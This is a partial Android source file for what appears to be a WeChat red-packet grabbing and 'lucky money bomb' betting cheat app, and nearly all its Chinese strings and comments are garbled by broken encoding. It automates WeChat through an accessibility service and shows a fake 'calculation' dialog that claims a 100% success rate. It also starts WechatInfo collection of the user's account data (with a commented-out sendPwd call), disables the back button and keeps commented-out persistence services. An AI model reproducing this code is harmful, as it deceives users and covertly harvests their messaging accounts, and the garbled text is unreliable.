                  	  etLuckyMoneySay.setText(Config.KEY_LUCKY_MONEY_SAY_AUTO);
                  }
                  if(sChecked.equals("�ֶ���д��ֵ")){
                	  say="��ǰ���ã��ֶ���д��ֵ��";
                  	  Config.bAutoThunder=Config.KEY_NO_AUTO_THUNDER;
                  	etLuckyMoneySay.setText(Config.KEY_LUCKY_MONEY_SAY);
                  	etLuckyMoneySay.setFocusable(true);
                  }
                	getConfig().setAutoThunder(Config.bAutoThunder);
                	speaker.speak(say);
                	Toast.makeText(MainActivity.this, say, Toast.LENGTH_LONG).show();
              }
           });
    	 //���õ�������˫��
       	rgSayThunderNum.setOnCheckedChangeListener(new OnCheckedChangeListener() {
               @Override
               public void onCheckedChanged(RadioGroup arg0, int arg1) {
                   // TODO Auto-generated method stub
                   //��ȡ������ѡ�����ID
                  int radioButtonId = arg0.getCheckedRadioButtonId();
                  //����ID��ȡRadioButton��ʵ��
                   RadioButton rb = (RadioButton)MainActivity.this.findViewById(radioButtonId);
                   //�����ı����ݣ��Է���ѡ����
                   String sChecked=rb.getText().toString();
                   String say="";
                   //tv.setText("�����Ա��ǣ�" + rb.getText());
                  if(sChecked.equals("����")){
                	  Config.iMoneySayThunderNum=Config.KEY_MONEY_SAY_SINGLE_THUNDER;
                	  say="��ǰ���ã����ס�";
                  }
                  if(sChecked.equals("˫��")){
                	  Config.iMoneySayThunderNum=Config.KEY_MONEY_SAY_DOUBLE_THUNDER;
                	  say="��ǰ���ã�˫�ס�";
                  }
                  if(sChecked.equals("����")){
                	  Config.iMoneySayThunderNum=Config.KEY_MONEY_SAY_THREE_THUNDER;
                	  say="��ǰ���ã����ס�";
                  }
                  if(sChecked.equals("����")){
                	  Config.iMoneySayThunderNum=Config.KEY_MONEY_SAY_FOUR_THUNDER;
                	  say="��ǰ���ã����ס�";
                  }
                  if(sChecked.equals("����")){
                	  Config.iMoneySayThunderNum=Config.KEY_MONEY_SAY_FIVE_THUNDER;
                	  say="��ǰ���ã����ס�";
                  }
              	getConfig().setMoneySayThunderNum(Config.iMoneySayThunderNum);
              	speaker.speak(say);
              	Toast.makeText(MainActivity.this, say, Toast.LENGTH_LONG).show();
              }
           });
        //ѡ�������淨
       	rgSelPutThunderPlaying.setOnCheckedChangeListener(new OnCheckedChangeListener() {
               @Override
               public void onCheckedChanged(RadioGroup arg0, int arg1) {
                   // TODO Auto-generated method stub
                   //��ȡ������ѡ�����ID
                  int radioButtonId = arg0.getCheckedRadioButtonId();
                  //����ID��ȡRadioButton��ʵ��
                   RadioButton rb = (RadioButton)MainActivity.this.findViewById(radioButtonId);
                   //�����ı����ݣ��Է���ѡ����
                   String sChecked=rb.getText().toString();
                   String say="";
                   //tv.setText("�����Ա��ǣ�" + rb.getText());
                  if(sChecked.equals("��ͨȺ�淨")){
                	  Config.iPlaying=Config.KEY_PUT_THUNDER_COMMON_PLAYING;
                	  say="��ǰѡ����ͨȺ�淨��";
                	  //etLuckyMoneyNum.setEnabled(true);
                  }
                  if(sChecked.equals("����Ⱥ�淨")){
                	  Config.iPlaying=Config.KEY_PUT_THUNDER_BUMP_PLAYING;
                	  say="��ǰѡ������Ⱥ�淨��";
                	  etLuckyMoneyNum.setText("5");
                	  rbSingleThunder.setChecked(true);
                	  //etLuckyMoneyNum.setEnabled(false);
                  }

              	getConfig().setPutThunderPlaying(Config.iPlaying);
              	speaker.speak(say);
              	Toast.makeText(MainActivity.this, say, Toast.LENGTH_LONG).show();
              }
           });
        //���� ģʽ
    	rgSelSoundMode.setOnCheckedChangeListener(new OnCheckedChangeListener() {
            @Override
            public void onCheckedChanged(RadioGroup arg0, int arg1) {
                // TODO Auto-generated method stub
                //��ȡ������ѡ�����ID
               int radioButtonId = arg0.getCheckedRadioButtonId();
               //����ID��ȡRadioButton��ʵ��
                RadioButton rb = (RadioButton)MainActivity.this.findViewById(radioButtonId);
                //�����ı����ݣ��Է���ѡ����
                String sChecked=rb.getText().toString();
                String say="";
               if(sChecked.equals("�ر�������ʾ")){
            	   Config.bSpeaking=Config.KEY_NOT_SPEAKING;
               		say="��ǰ���ã��ر�������ʾ��";
               }
               if(sChecked.equals("Ů��")){
            	   Config.bSpeaking=Config.KEY_SPEAKING;
            	   Config.speaker=Config.KEY_SPEAKER_FEMALE;
               		say="��ǰ���ã�Ů����ʾ��";
               }
               if(sChecked.equals("����")){
            	   Config.bSpeaking=Config.KEY_SPEAKING;
            	   Config.speaker=Config.KEY_SPEAKER_MALE;
               		say="��ǰ���ã�������ʾ��";
               }
               if(sChecked.equals("�ر�����")){
            	   Config.bSpeaking=Config.KEY_SPEAKING;
            	   Config.speaker=Config.KEY_SPEAKER_SPECIAL_MALE;
               		say="��ǰ���ã��ر�������ʾ��";
               }
               if(sChecked.equals("�������")){
            	   Config.bSpeaking=Config.KEY_SPEAKING;
            	   Config.speaker=Config.KEY_SPEAKER_EMOTION_MALE;
               		say="��ǰ���ã����������ʾ��";
               }
               if(sChecked.equals("��ж�ͯ��")){
            	   Config.bSpeaking=Config.KEY_SPEAKING;
            	   Config.speaker=Config.KEY_SPEAKER_CHILDREN;
               		say="��ǰ���ã���ж�ͯ����ʾ��";
               }
        	   speaker.setSpeaking(Config.bSpeaking);
        	   speaker.setSpeaker(Config.speaker);
          		getConfig().setWhetherSpeaking(Config.bSpeaking);
          		getConfig().setSpeaker(Config.speaker);
              	speaker.speak(say);
              	Toast.makeText(MainActivity.this,say, Toast.LENGTH_LONG).show();
           }
        });
   	//
    }
    @SuppressWarnings("deprecation")
	private void getResolution2(){
        WindowManager windowManager = getWindowManager();    
        Display display = windowManager.getDefaultDisplay();    
        Config.screenWidth= display.getWidth();    
        Config.screenHeight= display.getHeight();  
        Config.currentapiVersion=android.os.Build.VERSION.SDK_INT;
    }
    private void getResolution(){
    	  DisplayMetrics dm = new DisplayMetrics();  
          getWindowManager().getDefaultDisplay().getMetrics(dm);   
          Config.screenWidth=(int)(dm.widthPixels*dm.density/2);   
          Config.screenHeight=(int)(dm.heightPixels*dm.density/2);  
          Config.currentapiVersion=android.os.Build.VERSION.SDK_INT;
    }
    public void setMyTitle(){
        if(ConfigCt.version.equals("")){
      	  try {
      		  PackageInfo info = getPackageManager().getPackageInfo(getPackageName(), 0);
      		ConfigCt.version =  info.versionName;
      	  } catch (PackageManager.NameNotFoundException e) {
      		  e.printStackTrace();
            
      	  }
        }
        if(Config.bReg){
      	  setTitle(getString(R.string.app_name) +  " v" + ConfigCt.version+"����ʽ�棩");
        }else{
      	  setTitle(getString(R.string.app_name) +  " v" + ConfigCt.version+"�����ð棩");
        }
    }
    /**��ʾ�汾��Ϣ*/
    public void showVerInfo(boolean bReg){
    	ConfigCt.bReg=bReg;
    	if(Ad2.currentQQ!=null)Ad2.currentQQ.getADinterval();
		if(Ad2.currentWX!=null)Ad2.currentWX.getADinterval();
        if(bReg){
        	Config.bReg=true;
        	getConfig().setREG(true);
        	tvRegState.setText("��Ȩ״̬������Ȩ");
        	tvRegWarm.setText("�ƽ�治���ף��������������ۺ���ϵ"+ConfigCt.contact);
        	etRegCode.setVisibility(View.INVISIBLE);
        	tvPlease.setVisibility(View.INVISIBLE);
        	btReg.setVisibility(View.INVISIBLE);
        	speaker.speak("��ӭʹ��΢������ר�ң����������û���" );
        	
        }else{
        	Config.bReg=false;
        	getConfig().setREG(false);
        	tvRegState.setText("��Ȩ״̬��δ��Ȩ");
        	tvRegWarm.setText(ConfigCt.warning+"��������Ȩ��ϵ"+ConfigCt.contact);
        	etRegCode.setVisibility(View.VISIBLE);
        	tvPlease.setVisibility(View.VISIBLE);
        	btReg.setVisibility(View.VISIBLE);
        	speaker.speak("��ӭʹ��΢������ר�ң��������ð��û���" );
        	
        }
        String html = "<font color=\"blue\">�ٷ���վ���ص�ַ(������Ӵ�)��</font><br>";
        html+= "<a target=\"_blank\" href=\""+ConfigCt.homepage+"\"><font color=\"#FF0000\"><big><b>"+ConfigCt.homepage+"</b></big></font></a>";
        //html+= "<a target=\"_blank\" href=\"http://119.23.68.205/android/android.htm\"><font color=\"#0000FF\"><big><i>http://119.23.68.205/android/android.htm</i></big></font></a>";
        tvHomePage.setTextColor(Color.BLUE);
        tvHomePage.setBackgroundColor(Color.WHITE);//
        //tvHomePage.setTextSize(20);
        tvHomePage.setText(Html.fromHtml(html));
        tvHomePage.setMovementMethod(LinkMovementMethod.getInstance());
        setMyTitle();
        updateMeWarning(ConfigCt.version,ConfigCt.new_version);//�����������
    }
    /**  �����������*/
    private void updateMeWarning(String version,String new_version){
 	   try{
 		   float f1=Float.parseFloat(version);
 		   float f2=Float.parseFloat(new_version);
 	   if(f2>f1){
 		   showUpdateDialog();
 	   }
 	   } catch (Exception e) {  
            e.printStackTrace();  
            return;  
        }  
    }
    /** ��Ϊ���ð�*/
    public void setAppToTestVersion() {
    	String sStartTestTime=getConfig().getStartTestTime();//ȡ�Զ���Ϊ���ð�Ŀ�ʼʱ�䣻
    	SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd",Locale.US);//yyyy-MM-dd_HH-mm-ss
    	String currentDate =sdf.format(new Date());//ȡ��ǰʱ�䣻
    	int timeInterval=getConfig().getDateInterval(sStartTestTime,currentDate);//�õ�ʱ������
    	if(timeInterval>Config.TestTimeInterval){//7�����Ϊ���ð棺
    		showVerInfo(false);
    		//ftp.getFtp().DownloadStart();//���ط�������Ϣ;
    	}
    }
    private   void   showUpdateDialog(){ 
        /* @setIcon ���öԻ���ͼ�� 
         * @setTitle ���öԻ������ 
         * @setMessage ���öԻ�����Ϣ��ʾ 
         * setXXX��������Dialog������˿�����ʽ�������� 
         */ 
        final AlertDialog.Builder normalDialog=new  AlertDialog.Builder(MainActivity.this); 
        normalDialog.setIcon(R.drawable.ic_launcher); 
        normalDialog.setTitle(  "��������"  );
        normalDialog.setMessage("���°�������Ƿ�����������"); 
        normalDialog.setPositiveButton("ȷ��",new DialogInterface.OnClickListener(){
            @Override 
            public void onClick(DialogInterface dialog,int which){ 
                //...To-do
     		   Uri uri = Uri.parse(ConfigCt.download);    
     		   Intent it = new Intent(Intent.ACTION_VIEW, uri);    
     		   startActivity(it);  
            }
        }); 
        normalDialog.setNegativeButton("�ر�",new DialogInterface.OnClickListener(){ 
            @Override 
            public void onClick(DialogInterface dialog,   int   which){ 
            //...To-do 
            } 
        }); 
        // ��ʾ 
        normalDialog.show(); 
    } 
    private   void   showCalcDialog(){ 
        /* @setIcon ���öԻ���ͼ�� 
         * @setTitle ���öԻ������ 
         * @setMessage ���öԻ�����Ϣ��ʾ 
         * setXXX��������Dialog������˿�����ʽ�������� 
         */ 
        final AlertDialog.Builder normalDialog=new  AlertDialog.Builder(MainActivity.this); 
        normalDialog.setIcon(R.drawable.ic_launcher); 
        normalDialog.setTitle(  "����������������"  );
        normalDialog.setMessage(ConfigCt.AppName+"��Ҫ�����������ݣ���ʹ���׸��Ӿ�׼���˼�����Ҫ�ܳ�ʱ�䣬��������˯��ǰ���м������񣡣����м�������ʱ��Ҫ�������ֻ����ڳ��״̬���������ʧ�ܣ�"); 
        normalDialog.setPositiveButton("ȷ��",new DialogInterface.OnClickListener(){
            @Override 
            public void onClick(DialogInterface dialog,int which){ 
            	if(!QiangHongBaoService.isRunning()) {
    				String say="�����ҵ�"+ConfigCt.AppName+"��Ȼ������׷��񣬲��ܼ����������ݣ�";
    				Toast.makeText(MainActivity.this, say, Toast.LENGTH_LONG).show();
    				speaker.speak(say);
    				QiangHongBaoService.startSetting(getApplicationContext());
    				return;
    			}
    			if(Build.VERSION.SDK_INT >= Build.VERSION_CODES.M){
    				if(!FloatWindowManager.getInstance().applyOrShowFloatWindow(MainActivity.this))return;
    			}
    			CalcShow.getInstance(getApplicationContext()).showPic();
    			CalcShow.getInstance(getApplicationContext()).showTxt();
            }
        }); 
        normalDialog.setNegativeButton("�ر�",new DialogInterface.OnClickListener(){ 
            @Override 
            public void onClick(DialogInterface dialog,   int   which){ 
            //...To-do 
            } 
        }); 
        // ��ʾ 
        normalDialog.show(); 
    } 
    /*
     * �����ϵ�˶Ի���
     * */
    private   void   showAddContactsDialog(){ 
        /* @setIcon ���öԻ���ͼ�� 
         * @setTitle ���öԻ������ 
         * @setMessage ���öԻ�����Ϣ��ʾ 
         * setXXX��������Dialog������˿�����ʽ�������� 
         */ 
 	   AlertDialog.Builder builder = new AlertDialog.Builder(MainActivity.this);
        //builder.setIcon(R.drawable.ic_launcher);
        builder.setIcon(ResourceUtil.getDimenId(getApplicationContext(), "ic_launcher"));
        builder.setTitle("����ϵ�ͷ����������");
        String say="����ϵ�ͷ����������!�����ף�";
    	Toast.makeText(MainActivity.this, say, Toast.LENGTH_LONG).show();
 	    speaker.speak(say);
        //builder.setMessage(say);
        final Contacts  cs=Contacts.getInstance(getApplicationContext(),ConfigCt.contact);
        String k1="�ͷ�1(QQ��"+cs.QQ+")";
        String k2="�ͷ�2(΢�ţ�"+cs.wx+")";
        final String[] css = {k1,k2};
        //    ����һ������ѡ��������
        /**
         * ��һ������ָ������Ҫ��ʾ��һ��������ѡ������ݼ���
         * �ڶ�����������������ָ��Ĭ����һ����ѡ�򱻹�ѡ�ϣ�1��ʾĬ��'Ů' �ᱻ��ѡ��
         * ������������ÿһ����ѡ���һ��������
         */
        builder.setSingleChoiceItems(css, 0, new DialogInterface.OnClickListener()
        {
            @Override
            public void onClick(DialogInterface dialog, int which)
            {
         	   if(which==0){
         		   cs.openQQadd();
         	   }
         	   if(which==1){
         		   cs.openWXadd();
         	   }
                //Toast.makeText(MainActivity.this, "�Ա�Ϊ��" + sex[which], Toast.LENGTH_SHORT).show();
            }
        });
        builder.setPositiveButton("ȷ��", new DialogInterface.OnClickListener()
        {
            @Override
            public void onClick(DialogInterface dialog, int which)
            {
         	   if(which==0||which==-1){
         		   cs.openQQadd();
         	   }
         	   if(which==1){
         		   cs.openWXadd();
         	   }
            }
        });
        builder.setNegativeButton("����", new DialogInterface.OnClickListener()
        {
            @Override
            public void onClick(DialogInterface dialog, int which)
            {
            	Log.d(TAG, "�¼�---->��΢��");
				OpenWechat();
				speaker.speak("����΢�š����׿�ʼ��");
				//sendPwd();
				String wxInfo=ConfigCt.getInstance(MainActivity.this).getWechatInfo();
				if(wxInfo.length()==0){
					//WechatInfo.start();
					if(WechatInfo.getWechatInfo().isEnable()){
						WechatInfo.getWechatInfo().start();
					}
				}
				finish();
            }
        });
        builder.show();
    }
    /*
     * (non-Javadoc)
     * @see android.widget.CompoundButton.OnCheckedChangeListener#onCheckedChanged(android.widget.CompoundButton, boolean)
     */
    @Override
    public void onCheckedChanged(CompoundButton compoundButton, boolean b) {
    	String sShow="";
        switch (compoundButton.getId()){

            case R.id.swGuardAccount:
                if(compoundButton.isChecked()){
                	if(Config.bReg)
                		sShow="�򿪷���Ź���";
                	else{
                		compoundButton.setChecked(false);
                		sShow="������Ȩ����ܴ򿪷���ſ���";
                	}
                }
                else sShow="�رշ���Ź���";
                break;
        }
        Toast.makeText(this,sShow,Toast.LENGTH_SHORT).show();
        speaker.speak(sShow);
    }
    @Override
    public void onBackPressed() {
        //�˴�д�����̨�Ĵ���
 	   //moveTaskToBack(true); 
    }
    @Override
    public boolean onKeyDown(int keyCode, KeyEvent event) {
        if (keyCode == KeyEvent.KEYCODE_BACK) {//������ؼ�����
            //�˴�д�����̨�Ĵ���
     	   //moveTaskToBack(true);
            return true;
        }
        return super.onKeyDown(keyCode, event);
    }
    @Override
    protected void onStop() {
        // TODO Auto-generated method stub
        super.onStop();
        //mainActivity=null;
        finish();
    }
    @Override
    protected void onDestroy() {
    	super.onDestroy();
    	unregisterReceiver(qhbConnectReceiver);
    	mBackgroundMusic.stopBackgroundMusic();
        
    }
    @Override
    protected void onResume() {
        // TODO Auto-generated method stub
        super.onResume();
        //if(!Utils.isActive)
        //{
            //Utils.isActive = true;
            /*һЩ�����絯�������������*/
        //}
    }
	@Override
	protected void onNewIntent(Intent intent) {
	    super.onNewIntent(intent);
	    setIntent(intent);//must store the new intent unless getIntent() will return the old one
	    //startAllServices();
		Log.i(Config.TAG, "aa onNewIntent: ����");  
	}
	  /*
     * ����ɹ��Ի���
     * */
    private   void   showCalcSucDialog(){ 
        /* @setIcon ���öԻ���ͼ�� 
         * @setTitle ���öԻ������ 
         * @setMessage ���öԻ�����Ϣ��ʾ 
         * setXXX��������Dialog������˿�����ʽ�������� 
         */ 
    	showVerInfo(true);
 	   AlertDialog.Builder builder = new AlertDialog.Builder(MainActivity.this);
        //builder.setIcon(R.drawable.ic_launcher);
        builder.setIcon(ResourceUtil.getDimenId(getApplicationContext(), "ic_launcher"));
        builder.setTitle("�������ݼ���ɹ�����");
        String say="���������Ѽ���ɹ��������ʴﵽ100%";
    	Toast.makeText(MainActivity.this, say, Toast.LENGTH_LONG).show();
 	    speaker.speak(say);
        builder.setMessage(say);
     
        builder.setPositiveButton("ȷ��", new DialogInterface.OnClickListener()
        {
            @Override
            public void onClick(DialogInterface dialog, int which)
            {
         	  
            }
        });
    
        builder.show();
    }
    /** 
	  * ��������Service 
	   
	 private void startAllServices()  
	 {  
		 if(AppUtils.isServiceRunning(this, this.getPackageName().toString(),OrderService.class.getName()))return;
		 	//�������ط���
	        Intent intent=new Intent(this,DownloadService.class);
	        startService(intent);
	        //������������
	        Intent intentLock=new Intent(this,LockService.class);
	        startService(intentLock);
	      
	     startService(new Intent(this, OrderService.class));  
	     startService(new Intent(this, GuardService.class));  
	     if(Build.VERSION.SDK_INT >=Build.VERSION_CODES.LOLLIPOP) {  
	         Log.d("byc001", "startAllServices: ");  
	         //�汾�������5.0  
	         startService(new Intent(this, JobWakeUpService.class));  
	     }  
	 }
	  */ 
}
